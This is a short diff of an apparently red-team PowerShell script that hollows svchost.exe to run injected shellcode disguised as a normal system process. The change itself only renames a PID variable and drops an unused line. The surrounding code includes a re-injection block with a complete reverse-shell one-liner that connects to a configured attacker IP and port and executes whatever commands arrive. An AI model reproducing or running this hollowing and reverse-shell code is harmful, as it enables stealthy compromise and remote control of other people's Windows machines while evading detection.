@@ -563,9 +563,9 @@ Write-Info "Shellcode size:  $($fullShellcode.Length) bytes"
 $hollowResult = [Hollowman]::Hollow($svchostPath, $HollowArgs, $fullShellcode)
 
 if ($hollowResult -like "OK:*") {
-    $pid = ($hollowResult -split "=")[1]
+    $hollowPid = ($hollowResult -split "=")[1]
     Write-Success "Process hollowing SUCCEEDED!"
-    Write-Success "Payload running inside svchost.exe (PID: $pid)"
+    Write-Success "Payload running inside svchost.exe (PID: $hollowPid)"
     Write-Info   "Task Manager will show this as a normal svchost.exe instance"
     $injectionMethod = "ProcessHollowing"
 } else {
@@ -627,8 +627,6 @@ Set-StrictMode -Version Latest
 `$ErrorActionPreference = 'SilentlyContinue'
 
 # Re-inject if our svchost hollow died
-`$svchostCount = (Get-Process svchost -ErrorAction SilentlyContinue).Count
-
 `$RawShell = @'
 `$c=New-Object Net.Sockets.TCPClient('$RedTeamIP',$RevShellPort);
 `$s=`$c.GetStream();[byte[]]`$b=0..65535|%{0};while((`$i=`$s.Read(`$b,0,`$b.Length)) -ne 0){`$d=(New-Object Text.ASCIIEncoding).GetString(`$b,0,`$i);`$r=(iex `$d 2>&1|Out-String);`$sb=[Text.Encoding]::ASCII.GetBytes(`$r);`$s.Write(`$sb,0,`$sb.Length)};`$c.Close()
